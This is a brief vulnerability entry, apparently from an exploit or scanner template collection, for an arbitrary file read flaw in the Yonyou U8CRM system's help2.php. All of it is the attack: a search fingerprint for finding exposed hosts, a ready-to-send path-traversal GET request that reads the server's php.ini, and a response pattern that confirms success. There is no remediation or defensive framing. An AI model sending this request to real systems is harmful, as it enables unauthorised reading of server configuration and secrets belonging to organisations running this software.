# 用友U8CRM系统help2任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="用友U8CRM"`
- **请求**：`GET /pub/help2.php?key=/../../apache/php.ini HTTP/1.1`
- **响应特征**：200 ^(?=.*?about)(?=.*?php.ini).*?$